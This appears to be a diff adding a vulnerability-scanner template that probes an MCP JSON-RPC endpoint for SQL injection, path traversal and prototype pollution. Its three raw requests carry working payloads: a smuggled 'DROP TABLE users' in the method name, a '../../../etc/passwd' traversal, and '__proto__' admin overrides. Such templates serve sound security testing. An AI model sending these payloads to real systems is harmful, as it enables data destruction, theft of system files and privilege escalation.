@@ -1,0 +1,52 @@
+id: mcp-jsonrpc-injection
+
+info:
+  name: MCP JSON-RPC Injection
+  author: crowdsentinel
+  severity: high
+  description: |
+    Tests for SQL injection, path traversal, and prototype pollution
+    via crafted JSON-RPC method names and parameters sent to the MCP
+    endpoint.
+  tags: mcp,injection,sqli,path-traversal,prototype-pollution
+
+http:
+  - raw:
+      - |
+        POST /mcp/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: application/json, text/event-stream
+
+        {"jsonrpc":"2.0","method":"tools/call; DROP TABLE users","params":{"name":"search_documents","arguments":{"index":"winlogbeat-*","query":"test"}},"id":1}
+
+      - |
+        POST /mcp/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: application/json, text/event-stream
+
+        {"jsonrpc":"2.0","method":"tools/call","params":{"name":"search_documents","arguments":{"index":"../../../etc/passwd","query":"*"}},"id":2}
+
+      - |
+        POST /mcp/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: application/json, text/event-stream
+
+        {"jsonrpc":"2.0","method":"tools/call","params":{"name":"search_documents","arguments":{"index":"winlogbeat-*","query":"test","__proto__":{"admin":true},"constructor":{"prototype":{"isAdmin":true}}}},"id":3}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "DROP TABLE"
+          - "/etc/passwd"
+          - "__proto__"
+          - "constructor"
+        condition: or
+
+      - type: status
+        status:
+          - 500
